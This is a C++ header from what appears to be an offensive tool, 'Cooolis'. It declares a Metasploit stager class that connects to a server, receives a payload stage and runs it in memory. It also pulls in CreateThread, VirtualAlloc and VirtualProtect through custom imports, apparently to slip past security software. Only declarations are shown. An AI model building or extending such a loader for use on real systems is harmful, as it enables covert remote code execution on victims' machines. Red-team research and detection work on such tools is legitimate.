#pragma once
#ifndef COOOLIS_MSF
#define COOOLIS_MSF

#include <WinSock2.h>
#include <Windows.h>
#include <iostream>
#include <winbase.h>
#include <tchar.h>
#include <Ws2tcpip.h>
#include "MemoryModule.h"
#include "Kernel32-Import.h"

extern ImportCreateThread CooolisCreateThread;
extern ImportVirtualProtect CooolisVirtualProtect;
extern ImportVirtualProtectEx CooolisVirtualProtectEx;
extern ImportVirtualAlloc CooolisVirtualAlloc;

// MemoryModule 加载函数
typedef BOOL(*Module)(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved);

// 单次发送PAYLAOD的数据包体长度，暂时不可改变
CONST INT PAYLOAD_LEN = 200;

// 内存对齐
#pragma pack(4)
struct stager {
	char payload[PAYLOAD_LEN];
	char options[PAYLOAD_LEN];
};
#pragma pack()

class CCooolisMetasploit
{

public:
	CCooolisMetasploit();
	~CCooolisMetasploit();
	BOOL SendPayload(std::string options, std::string payload);
	BOOL RecvStage();
	BOOL ConnectServer(std::string host, USHORT port);
	VOID GoodCooolis();
private:
	SOCKET socks = NULL; // 套接字
	stager* getStager;
	HANDLE hThread = NULL; // 线程句柄

	CHAR* pSpace = NULL;
};


#endif // !COOOLIS_MSF

